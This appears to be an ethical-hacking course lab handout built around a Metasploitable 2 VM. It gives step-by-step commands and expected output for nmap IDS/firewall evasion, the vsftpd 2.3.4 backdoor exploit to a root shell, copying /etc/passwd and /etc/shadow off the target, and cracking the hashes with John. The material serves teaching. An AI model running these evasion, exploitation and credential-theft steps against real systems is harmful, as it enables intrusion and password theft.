Part 1 — Evasion

Do together after Section 1 (IDS / firewall / honeypot evasion)
Goal: run four scans with different evasion options and confirm they return the SAME open ports — evasion changes the profile, not the result.

1.1 — Baseline, fragment, decoy, source-port

Do this (exact commands)
sudo nmap -sS -Pn -p 21,22,80,445 $MS2                       # baseline
sudo nmap -sS -Pn -f -p 21,22,80,445 $MS2                    # fragment the TCP header
sudo nmap -sS -Pn -D RND:4 -p 21,22,80,445 $MS2             # 4 decoy source addresses
sudo nmap -sS -Pn --source-port 53 -T2 -p 21,22,80,445 $MS2 # trusted source port + polite timing
What each part means
-sS half-open SYN scan · -Pn skip host discovery · -p port list · -f 8-byte fragments (beats signature engines) · -D RND:4 four forged decoys (beats attribution) · --source-port 53 pose as DNS (beats a weak firewall rule) · -T2 polite/slow timing (beats rate alarms).
What you should see (expected on live MS2)
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
# identical across all four scans
What it means
Our lab has no IDS, so all four succeed — that is the point: the evaded scans still land while looking different on the wire. On a defended network the plain scan is the one that would be flagged.
Checkpoint: open Wireshark/tcpdump during the -f scan and confirm tiny IP fragments. Drop -f first if a firewall reassembles fragments. Full transcript: lab-assets/sample-output/nmap-evasion.txt.

Part 2 — Gain access & grab the credential files

Do together with the Metasploit demo — we run this early so the credential files are in hand for Parts 3–4
Goal: turn one real vulnerability (CVE-2011-2523) into a root session (CEH Phase 3), then copy /etc/passwd and /etc/shadow off the box as evidence.

2.1 — vsftpd 2.3.4 backdoor → root shell

Do this (exact commands)
msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $MS2
run
id ; hostname ; uname -a      # inside the session: proof of access
What each part means
search finds the module · use loads it · set RHOSTS the target · run fires it. No set PAYLOAD — the backdoor opens its own root shell on TCP 6200. id/hostname/uname -a are your proof.
What you should see
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
uid=0(root) gid=0(root)
What it means
Vulnerability = CVE-2011-2523; exploit = the module; session = your root shell = gaining access, Phase 3. Because you are now root, you can read the credential store that a normal user cannot — that is why we do this step first.
No payload was needed because the backdoor carries its own shell. Today’s framing (CEH gaining-access phase + vocabulary) differs from the Friday engagement framing (minimum proof for a client report). Fallback: lab-assets/sample-output/vsftpd-exploit.txt.

2.2 — Exfiltrate passwd + shadow

Do this (inside the root session)
cat /etc/passwd               # world-readable account list
cat /etc/shadow               # root only — you can read it now because you are root
Then save them on Kali for cracking
mkdir -p ~/eth-evidence
# paste each file's contents into these, or use the session's download:
#   (meterpreter) download /etc/passwd ; download /etc/shadow
# plain shell: copy-paste the cat output into the files below
nano ~/eth-evidence/passwd.txt     # paste /etc/passwd
nano ~/eth-evidence/shadow.txt     # paste /etc/shadow
What it means
You now hold the two files locally on Kali: passwd.txt (names + UIDs) and shadow.txt (the $id$salt$hash entries). Part 3 reads them field by field; Part 4 cracks shadow.txt. No VM? use lab-assets/shadow.txt as the labelled fallback.
If you have a meterpreter session, download /etc/passwd and download /etc/shadow pull the files straight to your Kali working directory. From the plain vsftpd shell, cat each file and paste it into the local copies. Capture proof (id/hostname/uname -a), then stop — gain access and prove it, do not damage the box.

Part 3 — Read the credential stores

Do together after Section 2 (Windows & Linux security architecture)
Goal: see where Linux keeps account names vs hashes, and read one hash field by field — using the files you grabbed in Part 2.

3.1 — passwd, shadow, SUID

Do this (exact commands)
head ~/eth-evidence/passwd.txt   # the account list you grabbed ('x' = hash is elsewhere)
cat  ~/eth-evidence/shadow.txt   # the hashes you grabbed as root in Part 2
ls -l /usr/bin/passwd            # on the target: note the SUID 's' bit
What each part means
/etc/passwd names + UIDs (UID 0 = root) · /etc/shadow the $id$salt$hash entries · ls -l shows permission bits; the s on passwd is the Set-User-ID bit.
What you should see
msfadmin:$1$msfadmin$rhyK715KFaBMnilXFzf10/:19000:0:99999:7:::
-rwsr-xr-x 1 root root ... /usr/bin/passwd
What it means
The hash lives in shadow, not passwd. $1$ = md5crypt; msfadmin = salt; the long chunk = hash. The SUID s is why a normal user can change their own password. This shadow.txt is the input for Part 4.
Field map: username : $id$ (algorithm) $salt$ hash : lastchange : min : max : warn : : :. For sha512 the id is $6$. Fallback: lab-assets/sample-output/shadow-cat.txt, passwd-ls.txt.

Part 4 — Password cracking & rainbow tables

Do together after Section 4 (cracking mechanism & rainbow tables)
Goal: crack the real md5crypt hashes you grabbed with John, then prove a salt beats a rainbow table but not a dictionary.

4.1 — Crack the Metasploitable 2 hashes

Do this (exact commands)
cd ~/eth-evidence                              # the shadow.txt you captured in Part 2
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
john --show shadow.txt
What each part means
john the cracker · --format=md5crypt these are $1$ hashes · --wordlist= the dictionary of candidates · shadow.txt the hashes you grabbed · --show prints what was recovered (from john.pot).
What you should see (VERIFIED recovered values)
msfadmin:msfadmin
user:user
postgres:postgres
service:service
sys:batman
klog:123456789
6 password hashes cracked, 0 left
What it means
Every hash fell because the password was a weak, guessable word — not because md5crypt was broken. A long random password would have survived. In class, use rockyou.txt; with lab-assets/lab-wordlist.txt all six fall in under a second.
The hashes are salted, yet John cracks them because a dictionary attack re-hashes each candidate with the salt (read from the file). A salt only defeats a pre-computed rainbow table. Hashcat equivalent: hashcat -m 500 -a 0 shadow.txt rockyou.txt. Fallback: lab-assets/sample-output/john-crack.txt.

4.2 — Same password, different salt (rainbow-table proof)

Do this
cat lab-assets/salt-demo.txt
# alice and bob BOTH chose "password123" but have different salts.
What you should see
alice:$1$Ab12Cd34$GwACh5Hxr.JAfRKgn7d9J0:...
bob:$1$Zz99Yy88$uYexDlgxuiAyQsFcWegJR0:...
What it means
Identical password, different salt → completely different hash. A rainbow table built for un-salted MD5 matches neither. But a dictionary attack cracks both, because it re-hashes "password123" with each salt. A salt defeats pre-computation, not weak passwords.
Why different: md5crypt mixes the salt in before hashing. Rainbow table: will NOT work (no salt+password chains; you’d need one table per salt). What cracks it: a dictionary attack with John/Hashcat. Fix for weak passwords = length + unpredictability, not just a salt.

Part 5 — Methodology map

Do together after Section 3 (CEH system-hacking methodology)
Goal: place today's actions into the four system-hacking stages and the five phases (no new commands — a 5-minute reasoning task).

5.1 — Which stage, which phase?

Do this

For each action, write the stage (gain access / escalate / maintain / clear tracks) and the CEH phase:

  1. You exploit the vsftpd backdoor and land a shell.
  2. You abuse a SUID-root binary to go from a normal user to root.
  3. You add a hidden admin account to survive a reboot.
  4. You clear /var/log/auth.log.
1 = gain access (Phase 3); 2 = escalate privileges (Phase 3); 3 = maintain access (Phase 4); 4 = clear tracks (Phase 5). Gaining access and escalation are both Phase 3. An ethical hacker documents what could be cleared rather than destroying the client’s logs.
